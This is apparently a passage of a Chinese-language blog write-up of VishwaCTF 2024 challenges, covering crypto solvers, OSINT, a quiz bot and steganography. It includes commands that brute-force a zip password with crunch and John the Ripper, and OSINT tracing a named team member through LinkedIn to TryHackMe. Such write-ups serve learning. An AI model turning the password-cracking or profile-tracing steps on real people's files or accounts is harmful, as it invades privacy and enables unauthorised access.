<p>再來可以想到，他會把key的每一位丟進polyc來算出一個奇怪的東西，所以我就想到我可以建個表，把ASCII的字丟進去算出對應的。之後再把key_enc根據表對應出來來還原key</p>
<p><strong>Script</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode, base64_encode</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">polyc = [<span class="number">4</span>,<span class="number">3</span>,<span class="number">7</span>]</span><br><span class="line">poly = np.poly1d(polyc)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">p,key</span>):</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(p(i)) <span class="keyword">for</span> i <span class="keyword">in</span> key)</span><br><span class="line"></span><br><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> new_key <span class="keyword">in</span> tqdm(product(<span class="built_in">range</span>(<span class="number">256</span>))):</span><br><span class="line">    key=<span class="built_in">bytes</span>(new_key)</span><br><span class="line">    enc = encrypt(poly,key)</span><br><span class="line">    dic[enc] = key</span><br><span class="line">    </span><br><span class="line">example_enc = <span class="string">&quot;☞➭⥄⫣Ⲋ⸹⿰ㆯ㍶☞⒗☞☞☞➭☞⥄☞⫣☞Ⲋ☞⸹☞⿰☞ㆯ☞㍶➭⒗➭&quot;</span></span><br><span class="line">p=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> example_enc:</span><br><span class="line">    p+=dic[i]</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/HJxeKx86a.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJxeKx86a.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key:b&#x27;12345678910111213141516171819202&#x27;</span><br></pre></td></tr></table></figure>

<p><div class="img-item" data-src="https://hackmd.io/_uploads/S1S-YgL6a.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S1S-YgL6a.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>最後直接解密就好了</p>
<blockquote>
<p>FLAG: VishwaCTF{s33_1_t0ld_y0u_1t_w45_345y}</p>
</blockquote>
<h2 id="Intellectual-Heir"><a href="#Intellectual-Heir" class="headerlink" title="Intellectual Heir"></a>Intellectual Heir</h2><p>題目</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># my secret to hide the combination of my safe in fornt of all without anyone getting a clue what it is ;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#some boring python function for conversion nothing new</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_ass</span>(<span class="params">input_string</span>):</span><br><span class="line">    ass_values = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> input_string:</span><br><span class="line">        ass_values.append(<span class="built_in">str</span>(<span class="built_in">ord</span>(char)))</span><br><span class="line">    ass_str = <span class="string">&#x27;&#x27;</span>.join(ass_values)</span><br><span class="line">    <span class="keyword">return</span> ass_str</span><br><span class="line"></span><br><span class="line">input_string = <span class="built_in">input</span>(<span class="string">&quot;Enter the Combination: &quot;</span>)</span><br><span class="line">result = str_to_ass(input_string)</span><br><span class="line">msg = <span class="built_in">int</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#not that easy, you figure out yourself what the freck is a &amp; z</span></span><br><span class="line">a =</span><br><span class="line">z =</span><br><span class="line"></span><br><span class="line">f = (? * ?) <span class="comment">#cant remember what goes in the question mark</span></span><br><span class="line">e = <span class="comment">#what is usually used</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ohh yaa!! now you cant figure out $h!t</span></span><br><span class="line">encrypted = <span class="built_in">pow</span>(msg, e, f)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(encrypted))</span><br><span class="line"></span><br><span class="line"><span class="comment">#bamm!! protection for primes</span></span><br><span class="line">number =</span><br><span class="line"><span class="built_in">bin</span> = <span class="built_in">bin</span>(number)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment">#bamm!! bamm!! double protection for primes</span></span><br><span class="line">bin_arr = np.array(<span class="built_in">list</span>(<span class="built_in">bin</span>), dtype=<span class="built_in">int</span>)</span><br><span class="line">result = np.sin(bin_arr)</span><br><span class="line">result = np.cos(bin_arr)</span><br><span class="line">np.savetxt(<span class="string">&quot;file1&quot;</span>, result)</span><br><span class="line">np.savetxt(<span class="string">&quot;file2&quot;</span>, result)</span><br></pre></td></tr></table></figure>
<p>只是把p,q經過三角函數後寫入檔案，把他轉回來就可以解密了，另外這邊猜測e&#x3D;65537</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ass_to_str</span>(<span class="params">input_string</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(input_string), <span class="number">2</span>):</span><br><span class="line">        code_point = <span class="built_in">int</span>(input_string[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        result += <span class="built_in">chr</span>(code_point)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#cos</span></span><br><span class="line"><span class="comment">#cos(1)=0.5...</span></span><br><span class="line"><span class="comment">#cos(0)=1</span></span><br><span class="line">first=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(line[<span class="number">0</span>]) == <span class="number">1</span>:</span><br><span class="line">            first=<span class="string">&#x27;&#x27;</span>.join([first,<span class="string">&quot;0&quot;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            first=<span class="string">&#x27;&#x27;</span>.join([first,<span class="string">&quot;1&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#sin</span></span><br><span class="line"><span class="comment">#sin(1)=0.8</span></span><br><span class="line"><span class="comment">#sin(0)=0</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">second=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(line[<span class="number">0</span>]) == <span class="number">0</span>:</span><br><span class="line">            second=<span class="string">&#x27;&#x27;</span>.join([second,<span class="string">&quot;0&quot;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            second=<span class="string">&#x27;&#x27;</span>.join([second,<span class="string">&quot;1&quot;</span>])</span><br><span class="line"><span class="comment"># sol RSA</span></span><br><span class="line">p=<span class="built_in">int</span>(first, base=<span class="number">2</span>)</span><br><span class="line">q=<span class="built_in">int</span>(second,base=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">enc=<span class="number">4400037514278889258479265625258024039636437755883377709505596356049534358755375772484057042989024750972247184288820831886430459963472328358741858934783775986591400972020736548834642094922678189447202173710409868474198821576627330424767999152339702779346380</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d= <span class="built_in">pow</span>(e,-<span class="number">1</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(enc,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(ass_to_str(<span class="built_in">str</span>(m)))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Flag: VishwaCTF{Y0U_@R3_T#3_W0RT#Y_OF_3}</p>
</blockquote>
<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="The-end-is-beginning"><a href="#The-end-is-beginning" class="headerlink" title="The end is beginning"></a>The end is beginning</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DESCRIPTION</span><br><span class="line">Me and my friends just finished our final semester of B.Tech, so we decided to have a trip somewhere, but due to some reason, many of them were not available for the trip, but we were all ok as less is more. As the trip was about to end, one of my friends said we should try scuba diving here. I was scared of that, but my friends said, If you don&#x27;t risk anything, you risk everything. Seriously, why do we have to risk our lives for half an hour? It&#x27;s impossible for me, I said. But they motivated me all night, and then it was time for the dive. I screamed, Impossible is not a word in my vocabulary, and dived in. After all this, when I came back to my room, I realised I was low on money, so I called and asked my father for some help by singing something like this:</span><br><span class="line"></span><br><span class="line">I’d be gone to my dad</span><br><span class="line">And ask for some cash</span><br><span class="line">I ran ......</span><br><span class="line"></span><br><span class="line">All the Hustle towards the trip was worth it, as we enjoyed it a lot and made some awesome memories throughout the trip.</span><br><span class="line"></span><br><span class="line">Flag format: VishwaCTF&#123;My Name according to story_Amount I got in figures&#125;</span><br><span class="line"></span><br><span class="line">Author : Abhinav</span><br><span class="line"></span><br><span class="line">FLAG FORMAT:</span><br><span class="line">VishwaCTF&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>根據他給的歌詞我找到了<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=ybRYNRcIuA4">https://www.youtube.com/watch?v=ybRYNRcIuA4</a></p>
<blockquote>
<p>FLAG: VishwaCTF{Paradox_5000}</p>
</blockquote>
<h2 id="TRY-HACK-ME"><a href="#TRY-HACK-ME" class="headerlink" title="TRY HACK ME"></a>TRY HACK ME</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DESCRIPTION</span><br><span class="line">TryHackMe is a browser-based cyber security training platform, with learning content covering all skill levels from the complete beginner to the seasoned hacker.</span><br><span class="line"></span><br><span class="line">One of our team member is very active on the platform. Recently, I got to know that he comes under 3% in the global leaderboard. Impressive isn&#x27;t it.</span><br><span class="line"></span><br><span class="line">Maybe you should have a look at his profile</span><br><span class="line"></span><br><span class="line">PS : He keeps his digital identity very simple. No fancy usernames. It&#x27;s just a simple mathematics</span><br><span class="line"></span><br><span class="line">His real name == His username</span><br><span class="line"></span><br><span class="line">Author : Amruta Patil</span><br><span class="line"></span><br><span class="line">FLAG FORMAT:</span><br><span class="line">VishwaCTF&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>要找一個他的成員是tryhackme 前3%的人所以我就先去他們官網看他們的成員<br><a target="_blank" rel="noopener" href="https://vishwactf.com/team/team.html">https://vishwactf.com/team/team.html</a><br>找到了一個人，有tryhackme的相關文章<br><a target="_blank" rel="noopener" href="https://www.linkedin.com/in/ankushkaudi/?originalSubdomain=in">https://www.linkedin.com/in/ankushkaudi/?originalSubdomain=in</a></p>
<p>順著去找tryhackme，就可以找到該帳號<br><a target="_blank" rel="noopener" href="https://tryhackme.com/p/ankushkaudi">https://tryhackme.com/p/ankushkaudi</a><br><div class="img-item" data-src="https://hackmd.io/_uploads/HJmLQ8mpp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJmLQ8mpp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<blockquote>
<p>FLAG: VishwaCTF{Pr0f1l3_1dent1fi3d_v0uch3r5_cr3d1t3d_5ucc355fully} </p>
</blockquote>
<h2 id="ifconfig-inet"><a href="#ifconfig-inet" class="headerlink" title="ifconfig_inet"></a>ifconfig_inet</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DESCRIPTION</span><br><span class="line">In the labyrinth of binary shadows, Elliot finds himself standing at the crossroads of justice and chaos. Mr. Robot, the enigmatic leader of the clandestine hacktivist group, has just unleashed a digital storm upon Evil Corp&#x27;s fortress. The chaos is palpable, but this is just the beginning.</span><br><span class="line"></span><br><span class="line">As the digital tempest rages, Elliot receives a cryptic message from Mr. Robot. &quot;To bring down Evil Corp, we must cast the shadows of guilt upon Terry Colby,&quot; the message echoes in the encrypted channels. However, in the haze of hacktivism, Elliot loses the crucial IP address and the elusive name of the DAT file, leaving him in a digital conundrum.</span><br><span class="line"></span><br><span class="line">To navigate this cybernetic maze, Elliot must embark on a quest through the binary underbelly of Evil Corp&#x27;s servers. The servers, guarded by firewalls and encrypted gatekeepers, conceal the secrets needed to ensure Terry Colby&#x27;s fall.</span><br><span class="line"></span><br><span class="line">Guide Elliot to the his destiny.</span><br><span class="line"></span><br><span class="line">Flag Format : VishwaCTF&#123;name of DAT file with extension_IP address of Terry Colby&#125;</span><br><span class="line"></span><br><span class="line">E.g : VishwaCTF&#123;file.dat_0.0.0.0&#125;</span><br></pre></td></tr></table></figure>
<p>keyword:Terry Colby<br><a target="_blank" rel="noopener" href="https://www.reddit.com/r/MrRobot/comments/ehhs2c/im_sure_many_of_you_noticed_terry_colbys_ip/">https://www.reddit.com/r/MrRobot/comments/ehhs2c/im_sure_many_of_you_noticed_terry_colbys_ip/</a><br><a target="_blank" rel="noopener" href="https://github.com/GabrielCrackPro/mr-robot-api">https://github.com/GabrielCrackPro/mr-robot-api</a></p>
<blockquote>
<p>FLAG: VishwaCTF{fsociety00.dat_218.108.149.373}</p>
</blockquote>
<h2 id="Sagar-Sangram"><a href="#Sagar-Sangram" class="headerlink" title="Sagar Sangram"></a>Sagar Sangram</h2><p>他給你了一個bot，問妳很多印度教問題，直接用gemini，他會給你總共十一題的答案</p>
<ul>
<li>gemini<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Q1 of 10 : So it was decided, to obtain the divine potion of immortality, churning of the ocean is to be performed. For that purpose a huge mountain was used. Tell me what is the name of the mountain and also which ocean was churned to obtain the potion of immortality?</span><br><span class="line">Ans fromat : name of ocean without space_name of mountain</span><br><span class="line">kshirasagara_mandara</span><br><span class="line">Q2 of 10 :Let&#x27;s get step back. Mount Mandara was used in churning. But it was not just around the ocean. It was brought there by someone. So, who brought Mount Mandara to Kshirasagara?</span><br><span class="line">Garuda</span><br><span class="line">Q3 of 10 : Now the stage is set but to churn the ocean, something was required which both the groups would hold and churn. Who was used like a rope to churn the ocean Kshirasagara?</span><br><span class="line">Vasuki</span><br><span class="line">Q4 of 10 : The process starts and the outcomes begin to appear. One such outcome was a very threatening substance, which had the power to destroy the whole universe. But &#x27;The Ultimate Destroyer&#x27; comes to rescue and consumed it, which results in his throat turning blue hence he is also called &#x27;Neelakantha&#x27;. What is the substance called?</span><br><span class="line">Halahala</span><br><span class="line">Q5 of 10 : Let&#x27;s talk about few more outcomes. One such divine outcome was a tree. It was taken to the abode of Indra in swarga. It is often referred to as &#x27;Wish Fulfilling Tree&#x27; as it  possess the power to bring one&#x27;s imagination into reality. Tell me the name of this tree?</span><br><span class="line">Kalpavrikshaa</span><br><span class="line">Q6 of 10 : Another creature appeared was a very powerful elephant which was taken by Lord Indra as his medium of transportation. It was very powerful elephant and also referred sometimes as &#x27;King of Elephants&#x27;. What is the name of that elephant?</span><br><span class="line">Airavata</span><br><span class="line">Q7 of 10 : After a while during the process, a bow appeared during the churning. It was given to Lord Vishnu as a weapon. What is the name of that divine bow?</span><br><span class="line">Sharanga</span><br><span class="line">Q8 of 10 : In ancient times as mentioned in the scriptures, conch was used as a sign to initiate a war between two groups (also used for other purposes as well). Different persons from both the sides would blow the conch which will mark the start of the war. During the churning, one such conch was obtained and it was given to Lord Vishnu. It&#x27;s sound symbolizes the &#x27;Sound of Creation&#x27;. What is the name of the conch?</span><br><span class="line">Panchajanya</span><br><span class="line">Q9 of 10 : The fortunes turned as the goddess of fortune herself appeared. Every wanted the goddess of fortune to be at their side, but the destiny has it&#x27;s own plan. She chose Lord Vishnu as her eternal consort.. Who is the goddess of fortune?</span><br><span class="line">Lakshmi</span><br><span class="line">Q10 of 10 : Ok, let&#x27;s end this thing. After all the struggle from both the sides, the long wait comes to an end. The divine potion is here and it is brought by none other than the physician of the devas. He is also referred to as &#x27;God of Ayurveda&#x27;. Tell me his name and also the name of divine potion?</span><br><span class="line">Ans format : name of the physicianname of divine potion</span><br><span class="line">Dhanvantari_Amrita</span><br><span class="line">Impressive. A perfect 10/10. You are one the who deserves the flag. Just one last thing. All the event which is I asked you about is very popular and is mentioned in various scriptures like Vishnu Purana, Mahabharata, etc. Can you tell me what this event is popularly known as?</span><br><span class="line">Use  in place of any space</span><br><span class="line">Samudra_Manthana</span><br><span class="line">Perfect. That&#x27;s all about this challenge. Hope you enjoyed it.</span><br><span class="line">Thank you for playing VishwaCTF&#x27;24. Here you go with the flag for the challenge &#x27;Sagar Sangram&#x27;</span><br><span class="line">VishwaCTF&#123;karmany-evadhikaras te ma phaleshu kadachana ma karma-phala-hetur bhur ma te sango stvakarmani&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>Flag: VishwaCTF{karmany-evadhikaras te ma phaleshu kadachana ma karma-phala-hetur bhur ma te sango stvakarmani}</p>
</blockquote>
<h1 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h1><h2 id="Secret-Code"><a href="#Secret-Code" class="headerlink" title="Secret Code"></a>Secret Code</h2><p>binwalk 來解出兩份檔案.<br>為<code>helper.txt</code>和<code>5ecr3t_c0de.zip</code><br>然後發現.zip需要密碼所以炸看看他<br><div class="img-item" data-src="https://hackmd.io/_uploads/ByWziJSJ0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ByWziJSJ0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crunch 6 6 0123456789 -o pass.txt</span><br><span class="line">zip2john 5ecr3t_c0de.zip &gt; hash.txt</span><br><span class="line">john --wordlist=pass.txt hash.txt</span><br></pre></td></tr></table></figure>
<p>找到後解壓縮出 <code>5ecr3t_c0de.txt</code> 和 <code>info.txt</code><br><div class="img-item" data-src="https://hackmd.io/_uploads/Sk0zjkSJA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Sk0zjkSJA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>看起來是一群座標點，把他點出來</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;5ecr3t_c0de.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    coordinates = [<span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, line.strip(<span class="string">&quot;()\n&quot;</span>).split(<span class="string">&quot;, &quot;</span>))) <span class="keyword">for</span> line <span class="keyword">in</span> lines]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_image</span>(<span class="params">coordinates</span>):</span><br><span class="line">    max_x = <span class="built_in">max</span>(coord[<span class="number">0</span>] <span class="keyword">for</span> coord <span class="keyword">in</span> coordinates)</span><br><span class="line">    max_y = <span class="built_in">max</span>(coord[<span class="number">1</span>] <span class="keyword">for</span> coord <span class="keyword">in</span> coordinates)</span><br><span class="line">    new_image = Image.new(<span class="string">&quot;RGB&quot;</span>, (max_x + <span class="number">1</span>, max_y + <span class="number">1</span>), color=<span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line">    draw = ImageDraw.Draw(new_image)</span><br><span class="line">    <span class="keyword">for</span> coord <span class="keyword">in</span> coordinates:</span><br><span class="line">        draw.point(coord, fill=<span class="string">&quot;black&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new_image</span><br><span class="line"></span><br><span class="line">new_image = generate_image(coordinates)</span><br><span class="line">new_image.show()</span><br></pre></td></tr></table></figure>

<p><div class="img-item" data-src="https://hackmd.io/_uploads/Bk4Iiyr1R.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Bk4Iiyr1R.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="We-Are-Valorant"><a href="#We-Are-Valorant" class="headerlink" title="We Are Valorant"></a>We Are Valorant</h2><p>給了你一張圖片跟影片<br>先修復圖片成.jpg | JPEG | ff d8 ff |<br>接下來看影片逐偵找會找到金鑰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key:Tenz</span><br></pre></td></tr></table></figure>
<p>下steghide解出來</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">naup96321@DESKTOP-T2ED0OK:~/vish$ steghide info g.jpg</span><br><span class="line">&quot;g.jpg&quot;:</span><br><span class="line">  format: jpeg</span><br><span class="line">  capacity: 185.8 KB</span><br><span class="line">Try to get information about embedded data ? (y/n) y</span><br><span class="line">Enter passphrase:</span><br><span class="line">  embedded file &quot;not_a_secret.txt&quot;:</span><br><span class="line">    size: 114.0 Byte</span><br><span class="line">    encrypted: rijndael-128, cbc</span><br><span class="line">    compressed: yes</span><br><span class="line">naup96321@DESKTOP-T2ED0OK:~/vish$ ls</span><br><span class="line"> g.jpg   k.txt   m.py   main.py   r.py  &#x27;we_are_valorant (1).jpg:Zone.Identifier&#x27;</span><br><span class="line">naup96321@DESKTOP-T2ED0OK:~/vish$ steghide extract -sf g.jpg -xf not_a_secret.txt -p Tenz</span><br><span class="line">wrote extracted data to &quot;not_a_secret.txt&quot;.</span><br><span class="line">naup96321@DESKTOP-T2ED0OK:~/vish$ ls</span><br><span class="line"> g.jpg   k.txt   m.py   main.py   not_a_secret.txt   r.py  &#x27;we_are_valorant (1).jpg:Zone.Identifier&#x27;</span><br><span class="line">naup96321@DESKTOP-T2ED0OK:~/vish$ cat not_a_secret.txt</span><br><span class="line">Hello!!</span><br><span class="line">hope you are enjoying the CTF</span><br><span class="line">here&#x27;s your flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VishwaCTF&#123;you_are_invited_to_the_biggest_valorant_event&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Flag: VishwaCTF{you_are_invited_to_the_biggest_valorant_event}</p>
</blockquote>

            </div>

            <!-- Post information -->
            
            
    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
        <ul class="pagination d-block text-center">
            
                <li class="previous page-item d-inline"><a href="/2024/03/31/MATH-Lucas-Sequence/" class="page-link float-left">&larr;  Newer</a></li>
            
            
                <li class="next page-item d-inline"><a href="/2024/03/10/AIS3-EOF-2024-Final/" class="page-link float-right">Older  &rarr;</a></li>
            
        </ul>
    </div>


            
                <!-- Comments -->
                

                

            

        </div>
    </div>
</article> 


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    <style>
        #toc-content .toc-link::before {
            background-color: transparent;
            max-height: 25px;
        }

        #toc-content .toc-link.is-active-link::before {
            background-color: #404040;
        }
    </style>
    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
            <i class="fas fa-list"></i>
        </button>
        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
            <div class="toc-widget">
                <div id="toc-content" class="text-truncate">
                </div>
            </div>
            <div class="toc-menu pt-3 pl-4">
                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
                <a class="back-to-top d-block py-1" href="#">Back to top</a>
                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
            </div>
        </div>
